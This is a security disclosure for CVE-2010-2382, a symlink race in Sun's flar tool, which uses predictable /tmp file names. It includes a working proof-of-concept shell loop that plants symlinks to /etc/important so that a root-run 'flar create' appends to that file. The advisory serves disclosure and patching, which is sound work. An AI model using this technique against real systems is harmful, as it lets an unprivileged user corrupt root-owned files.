Below is the full disclosure information for CVE-2010-2382.  It was
reported to security-alert@sun.com on 23 December, 2009 and assigned Sun
bug 6912851.

This vulnerability was addressed by Sun/Oracle in the July 2010 Critical
Patch Update
(http://www.oracle.com/technology/deploy/security/critical-patch-updates/cpujul2010.html).

- ------

flar appears to use several hard-coded temporary paths with the process
id appended such as these (possibly more--I didn't do an exhaustive search):

   /tmp/.flash_filter_one_.11534
   /tmp/.flash_filter_two_.11534
   /tmp/.flarcreate.hash.11534

As an unprivileged user, I was able to pre-create symlinks (for every
likely pid) to a file I didn't have write permission to like this:

   $ x=0
   $ while [ "$x" -le 30000 ];do
   > ln -s /etc/important /tmp/.flash_filter_one_.$x
   > x=$(expr "$x" + 1)
   > done

Later, when root creates a flash archive with:

   # flar create -n junk `pwd`/junk.flar

/etc/important is appended to.
